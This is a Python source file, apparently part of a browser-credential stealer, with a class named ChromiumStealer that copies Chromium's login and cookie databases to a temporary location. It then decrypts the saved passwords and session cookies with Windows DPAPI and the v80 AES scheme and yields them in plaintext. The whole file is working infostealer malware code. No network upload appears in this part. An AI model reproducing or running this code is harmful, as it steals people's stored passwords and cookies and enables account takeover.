import sqlite3, os, tempfile, string, random, shutil

from .crypter import Crypter
from .browsers import Browsers

class ChromiumStealer:
    def __init__(self, browser : Browsers):
        self.browser = browser

    def exists(self):
        return os.path.exists(self.browser.value['state'])

    def initialize_crypter(self):
        self.crypter = Crypter(self, self.browser)

    def logins(self):
        path = self._clone_db(self.browser.value.get('login'))
        sql = 'SELECT IFNULL(origin_url, action_url), username_value, password_value FROM logins'
        db = sqlite3.connect(path)
        try:
            r = db.execute(sql)
            for url, login, password in r.fetchall():
                if not url and not login: continue
                try:
                    decrypted_password = self.crypter.win_decrypt(password)
                    if not decrypted_password:
                        password = self.crypter.v80_decrypt(password)
                    else:
                        password = decrypted_password
                    yield {'url': url, 'login': login, 'password': password}
                except:
                    yield None
                    pass
        except:
            pass

    def cookies(self):
        path = self._clone_db(self.browser.value.get('cookies'))
        sql = 'SELECT host_key, name, encrypted_value FROM cookies'
        db = sqlite3.connect(path)
        db.text_factory = bytes
        r = db.execute(sql)
        for host_key, name, encrypted_value in r.fetchall():
            try:
                decrypted_cookie = self.crypter.v80_decrypt(encrypted_value)
                yield {'host': host_key.decode(), 'name': name.decode(), 'value': decrypted_cookie}
            except Exception as e:
                print(e)
                pass

    def _clone_db(self, path):
        name = ''.join([random.choice(string.ascii_lowercase) for x in range(9)])
        root = [tempfile.gettempdir(), os.environ.get('PUBLIC', None), os.environ.get('SystemDrive', None) + '\\']
        for r in root:
            try:
                temp = os.path.join(r, name)
                shutil.copy(path, temp)
                return temp
            except:
                pass
